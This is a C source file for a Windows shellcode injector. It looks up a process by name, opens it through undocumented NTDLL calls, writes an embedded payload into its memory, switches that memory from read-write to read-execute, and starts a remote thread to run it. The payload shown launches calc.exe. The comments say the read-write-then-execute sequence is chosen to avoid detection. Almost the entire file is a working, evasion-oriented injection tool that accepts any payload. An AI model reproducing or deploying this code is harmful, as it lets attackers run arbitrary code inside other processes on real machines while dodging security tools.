// Remade code for full NTDLL API shellcode injection
// This code contains one more NTAPI: NtprotectVirtualMemory
// Allocating memory as RWX is a huge red flag, and so in this code, we allocate it as RW, copy the shellcode and the use NtProtectVirtualMemory to change it to RX before creating the thread

#include <windows.h>
#include <stdio.h>
#include <TlHelp32.h>

#pragma comment (lib, "ntdll")
// This will be used for error handling, but basically on error NtOpenProcess returns a status other than this
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

// https://www.vergiliusproject.com/kernels/x64/Windows%2010%20|%202016/2110%2021H2%20(November%202021%20Update)/_UNICODE_STRING
//0x10 bytes (sizeof)
typedef struct _UNICODE_STRING
{
    USHORT Length;                                                          //0x0
    USHORT MaximumLength;                                                   //0x2
    PWSTR Buffer;                                                           //0x8
} UNICODE_STRING, * PUNICODE_STRING;

// https://www.vergiliusproject.com/kernels/x64/Windows%2010%20|%202016/2110%2021H2%20(November%202021%20Update)/_OBJECT_ATTRIBUTES
//0x30 bytes (sizeof)
typedef struct _OBJECT_ATTRIBUTES
{
    ULONG Length;                                                           //0x0
    PVOID RootDirectory;                                                    //0x8
    PUNICODE_STRING ObjectName;                                             //0x10
    ULONG Attributes;                                                       //0x18
    PVOID SecurityDescriptor;                                               //0x20
    PVOID SecurityQualityOfService;                                         //0x28
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES; 

// https://www.vergiliusproject.com/kernels/x64/Windows%2010%20|%202016/2110%2021H2%20(November%202021%20Update)/_CLIENT_ID
//0x10 bytes (sizeof)
typedef struct _CLIENT_ID
{
    PVOID UniqueProcess;                                                    //0x0
    PVOID UniqueThread;                                                     //0x8
} CLIENT_ID, *PCLIENT_ID;


// NTAPI Prototypes
// http://undocumented.ntinternals.net/
typedef NTSTATUS(NTAPI *pNtOpenProcess) (
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID ClientId
);

// http://undocumented.ntinternals.net/
typedef NTSTATUS(NTAPI *pNtAllocateVirtualMemory) (
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG ZeroBits,
    PULONG RegionSize,
    ULONG AllocationType,
    ULONG Protection
);

// http://undocumented.ntinternals.net/
typedef NTSTATUS(NTAPI *pNtWriteVirtualMemory) (
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    ULONG NumberOfBytesToWrite,
    PULONG NumberOfBytesWritten
);

// https://malapi.io/winapi/NtCreateThreadEx
// https://securityxploded.com/ntcreatethreadex.php#gsc.tab=0
typedef NTSTATUS(NTAPI *pNtCreateThreadEx) (
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID lpStartAddress,
    PVOID lpParameter,
    ULONG CreationFlags,
    SIZE_T StackZeroBits,
    SIZE_T SizeOfStackCommit,
    SIZE_T SizeOfStackReserver,
    PVOID lpBytesBuffer
);

// http://undocumented.ntinternals.net/
typedef NTSTATUS(NTAPI *pNtProtectVirtualMemory) (
    HANDLE ProcessHandle,
    PVOID *BaseAddress, // Pointer to the base address to protect, outputs base address to here
    PULONG NumberOfBytesToProtect, // Pointer to size of region to protect
    ULONG NewAccessProtection, // PAGE_*** Attributes
    PULONG OldAccessProtection // Recieve previous protection
);


// Calc payload
unsigned char payload[] = {
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"
};
size_t payload_len = sizeof(payload) + 1;

// Debug Symbols
char ok[6] = "\n(+)";
char in[6] = "\n\t(*)";
char err[6] = "\n(-)";
char ar[12] = "---------->";

int FindTarget(const char* procname){
    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
    int pid = 0;

    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hProcSnap == INVALID_HANDLE_VALUE){
        printf("%s Failed to take snapshot, error: %ld", err, GetLastError());

        return EXIT_FAILURE;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if(!Process32First(hProcSnap, &pe32)){

        printf("%s Failed to parse snapshot, error: %ld", err, GetLastError());
        CloseHandle(hProcSnap);
        return EXIT_FAILURE;
    }
    
    while(Process32Next(hProcSnap, &pe32)){
        if (strcmp(pe32.szExeFile, procname) == 0){
            pid = pe32.th32ProcessID;
            break;            
        }       
    }
    CloseHandle(hProcSnap);
    return pid;
}

int main(int argc, char *argv[]){

    DWORD pid = 0;
    CLIENT_ID ClientId = { 0 };
    OBJECT_ATTRIBUTES ObjectAttributes;
    NTSTATUS status;
    HMODULE hNTDLL = NULL;
    HANDLE hProc = NULL;
    HANDLE hThread = NULL;
    PVOID rBaseAddress;
    ULONG OldProtect;

    if(argc != 2 || !argv[1] || argv[1] == NULL){
        printf("%s Usage: %s <procname>\n ", err, argv[0]);
        return EXIT_FAILURE;
    }

    const char *procname = argv[1];

    // Find target PID
    pid = FindTarget(procname);
    if (pid == 0 || pid == EXIT_FAILURE){
        printf("%s Failed to find target", err);
        return EXIT_FAILURE;
    }

    printf("%s PID for target process %s found, PID = %d", ok, procname, pid);
    
    // Create Required Objects for NtOpenProcess
    ClientId = { (HANDLE)pid, NULL}; // For Client ID we want to set UniqueProcess to the PID of our target process
    ObjectAttributes = { sizeof(ObjectAttributes) }; // For object attricutes, we want the length to be the size of the struct itself

    // Get handle to NTDLL
    hNTDLL = GetModuleHandleW(L"ntdll");
    if(!hNTDLL || hNTDLL == NULL){
        printf("%s Failed to get handle to NTDLL, error: %ld", err, GetLastError());
        return EXIT_FAILURE;
    }

    printf("%s Got handle to NTDLL %s 0x%p", ok, ar, &hNTDLL);
    printf("%s Resolving NTAPIs", ok);

    // Create pointers to NTAPIs
    pNtOpenProcess NtOpenProcess = (pNtOpenProcess)GetProcAddress(hNTDLL, "NtOpenProcess");
    printf("%s Found NtOpenProcess %s 0x%p", ok, ar, &NtOpenProcess);
    printf("\t%s Created pointer to NtOpenProcess", in);

    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNTDLL, "NtCreateThreadEx");
    printf("%s Found NtCreateThreadEx %s 0x%p", ok, ar, &NtCreateThreadEx);
    printf("\t%s Created pointer to NtCreateThreadEx", in);

    pNtAllocateVirtualMemory NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(hNTDLL, "NtAllocateVirtualMemory");
    printf("%s Found NtAllocateVirtualMemory %s 0x%p", ok, ar, &NtAllocateVirtualMemory);
    printf("\t%s Created pointer to NtAllocateVirtualMemory", in);

    pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNTDLL, "NtWriteVirtualMemory");
    printf("%s Found NtWriteVirtualMemory %s 0x%p", ok, ar, &NtWriteVirtualMemory);
    printf("\t%s Created pointer to NtWriteVirtualMemory", in);

    pNtProtectVirtualMemory NtProtectVirtualMemory = (pNtProtectVirtualMemory)GetProcAddress(hNTDLL, "NtProtectVirtualMemory");
    printf("%s Found NtProtectVirtualMemory %s 0x%p", ok, ar, &NtProtectVirtualMemory);
    printf("\t%s Created pointer to NtProtectVirtualMemory", in);


    // Get Handle to target process
    status = NtOpenProcess(&hProc, PROCESS_ALL_ACCESS, &ObjectAttributes, &ClientId);
    if (!hProc || hProc == NULL){
        printf("%s Failed to get handle to %s [%d], error: %ld", err, procname, pid, GetLastError());
        return EXIT_FAILURE;
    }

    printf("%s Got handle to %s %s 0x%p", ok, procname, ar, &hProc);

    // Allocate Memory
    status = NtAllocateVirtualMemory(hProc, &rBaseAddress, 0, (PULONG)&payload_len, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
    printf("%s Allocated %zu bytes of READWRITE memory in %s %s 0x%p", ok, sizeof(payload), procname, ar, rBaseAddress);

    // Copy payload
    status = NtWriteVirtualMemory(hProc, rBaseAddress, payload, sizeof(payload), NULL);
    printf("%s Wrote %zu bytes to memory %s 0x%p", ok, sizeof(payload), ar, rBaseAddress);

    // Change memory protection
    status = NtProtectVirtualMemory(hProc, &rBaseAddress, (PULONG)&payload_len, PAGE_EXECUTE_READ, &OldProtect);
    printf("%s Changed memory protection on %zu bytes to PAGE_EXECUTE_READ %s 0x%p", ok, sizeof(payload), ar, rBaseAddress);

    // Create thread
    status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProc, rBaseAddress, NULL, 0, 0, 0, 0, NULL);
    if(!hThread || hThread == NULL){
        printf("%s Failed to create thread, error: %ld", err, GetLastError());
        return EXIT_FAILURE;
    }

    printf("%s Thread created", ok);
    printf("%s Waiting for execution to complete...", in);

    WaitForSingleObject(hThread, INFINITE);
    printf("%s Execution complete", in);

    printf("%s Cleaning up...", ok);
    CloseHandle(hThread);
    CloseHandle(hProc);

    return EXIT_SUCCESS;
}